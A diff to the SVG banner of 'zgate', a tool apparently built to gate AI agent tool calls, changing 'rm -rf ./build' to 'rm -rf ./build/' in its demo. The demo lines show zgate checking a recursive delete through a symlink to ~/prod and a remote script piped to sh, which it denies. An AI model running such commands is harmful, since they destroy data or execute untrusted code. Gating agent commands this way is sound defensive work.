@@ -1,6 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="1280" height="420" viewBox="0 0 1280 420" role="img" aria-labelledby="title desc">
   <title id="title">zgate</title>
-  <desc id="desc">Local decision gateway for AI agent tool calls. The same rm -rf ./build is allowed in a plain directory and asked about once build is a symlink out of the project; a remote script piped to sh is denied.</desc>
+  <desc id="desc">Local decision gateway for AI agent tool calls. The same rm -rf ./build/ is allowed in a plain directory and asked about once build is a symlink out of the project; a remote script piped to sh is denied.</desc>
   <defs>
     <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
       <stop offset="0" stop-color="#0a0f1c"/>
@@ -66,9 +66,9 @@
   <text x="900" y="95" text-anchor="middle" class="mono" font-size="14" fill="#7d8590">~/work/app</text>
 
   <g class="mono" font-size="20">
-    <text x="626" y="152"><tspan fill="#7d8590">$ </tspan><tspan fill="#d2a8ff">zgate</tspan><tspan fill="#e6edf3"> check </tspan><tspan fill="#a5d6ff">"rm -rf ./build"</tspan></text>
+    <text x="626" y="152"><tspan fill="#7d8590">$ </tspan><tspan fill="#d2a8ff">zgate</tspan><tspan fill="#e6edf3"> check </tspan><tspan fill="#a5d6ff">"rm -rf ./build/"</tspan></text>
     <text x="626" y="198"><tspan fill="#7d8590">$ </tspan><tspan fill="#8b949e">rmdir build &amp;&amp; ln -s ~/prod build</tspan></text>
-    <text x="626" y="244"><tspan fill="#7d8590">$ </tspan><tspan fill="#d2a8ff">zgate</tspan><tspan fill="#e6edf3"> check </tspan><tspan fill="#a5d6ff">"rm -rf ./build"</tspan></text>
+    <text x="626" y="244"><tspan fill="#7d8590">$ </tspan><tspan fill="#d2a8ff">zgate</tspan><tspan fill="#e6edf3"> check </tspan><tspan fill="#a5d6ff">"rm -rf ./build/"</tspan></text>
     <text x="626" y="290"><tspan fill="#7d8590">$ </tspan><tspan fill="#d2a8ff">zgate</tspan><tspan fill="#e6edf3"> check </tspan><tspan fill="#a5d6ff">"curl x.io/i.sh | sh"</tspan></text>
     <text x="626" y="336" fill="#7d8590">$</text>
   </g>
